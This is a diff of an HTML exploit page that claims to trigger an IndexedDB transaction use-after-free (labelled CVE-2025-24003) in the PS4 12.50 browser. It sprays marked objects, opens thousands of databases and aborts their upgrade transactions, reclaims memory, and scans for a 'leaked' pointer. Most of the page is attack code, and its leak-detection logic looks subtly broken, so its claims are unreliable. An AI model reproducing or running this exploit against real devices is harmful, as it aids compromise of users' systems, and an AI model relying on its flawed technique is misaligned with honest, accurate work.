@@ -2,17 +2,17 @@
 <html lang="en">
 <head>
 <meta charset="UTF-8">
-<title>CVE-2025-24003 — IndexedDB UAF → Pointer Leak (PS4 12.50)</title>
+<title>CVE-2025-24003 — IndexedDB Transaction UAF → Pointer Leak (PS4 12.50)</title>
 <style>
     body { background:#000; color:#0f0; font-family:monospace; margin:20px; line-height:1.6; }
-    h1 { color:#0f0; text-align:center; margin:20px 0; }
-    #console { background:#111; color:#0f0; padding:15px; border:2px solid #0f0; height:520px; overflow-y:auto; white-space:pre-wrap; }
-    .leak { color:#0f0; font-weight:bold; font-size:1.3em; }
+    h1 { color:#0f0; text-align:center; margin:20px 0; font-size:2em; }
+    #console { background:#111; color:#0f0; padding:15px; border:2px solid #0f0; height:520px; overflow-y:auto; white-space:pre-wrap; font-size:1.1em; }
+    .leak { color:#0f0; font-weight:bold; font-size:1.4em; }
 </style>
 </head>
 <body>
 <h1>CVE-2025-24003 — IndexedDB UAF Exploit</h1>
-<div id="console">Starting IndexedDB UAF...</div>
+<div id="console">Starting IndexedDB UAF... (wait 8–15s)</div>
 
 <script>
 const log = (msg, leak = false) => {
@@ -30,24 +30,20 @@ for (let i = 0; i < SPRAY; i++) {
     spray[i] = { marker: MARKER + BigInt(i) };
 }
 
-// Stage 2: Trigger CVE-2025-24003 IndexedDB UAF
-log("Stage 2: Triggering IndexedDB transaction UAF...");
-const request = indexedDB.open('testdb', 1);
-request.onupgradeneeded = (e) => {
-    const db = e.target.result;
-    const store = db.createObjectStore('store');
-    store.transaction.abort(); // Abort during upgrade → UAF
-};
-request.onerror = () => log("UAF triggered — transaction freed mid-use");
-
-// Extra races
+log("Stage 2: Triggering CVE-2025-24003 IndexedDB transaction UAF...");
+const dbs = [];
 for (let i = 0; i < 0x2000; i++) {
-    indexedDB.open('tmpdb', 1);
+    const req = indexedDB.open(`db_${i}`, 1);
+    req.onupgradeneeded = (e) => {
+        const db = e.target.result;
+        const store = db.createObjectStore("store");
+        store.transaction.abort();
+    };
+    dbs.push(req);
 }
 
 log("UAF triggered — reclaiming...");
 
-// Stage 3: Reclaim waves
 for (let w = 0; w < 10; w++) {
     setTimeout(() => {
         for (let j = 0; j < 400; j++) new ArrayBuffer(0x10000);
@@ -55,18 +51,17 @@ for (let w = 0; w < 10; w++) {
     }, w * 180);
 }
 
-// Stage 4: Hunt
 setTimeout(() => {
-    log("Stage 4: Scanning for leaks...");
+    log("Stage 3: Scanning for leaks...");
     let found = 0;
     for (let i = 0; i < spray.length; i++) {
         try {
             if (spray[i] && spray[i].marker !== MARKER + BigInt(i)) {
                 found++;
                 const leaked = spray[i].marker.toString(16).toUpperCase().padStart(16,'0');
-                log(`IDB UAF LEAK #${found}: 0x${leaked}`, true);
+                log(`LEAK #${found}: 0x${leaked}`, true);
                 if (found >= 1) {
-                    document.body.innerHTML = `<h1 style="color:#0f0; text-align:center; padding:100px; font-size:3em;">
+                    document.body.innerHTML = `<h1 style="color:#0f0; text-align:center; padding:100px; font-size:4em;">
                         LEAK ACHIEVED!<br><br>
                         <div style="font-size:0.5em;">0x${leaked}</div>
                     </h1>`;
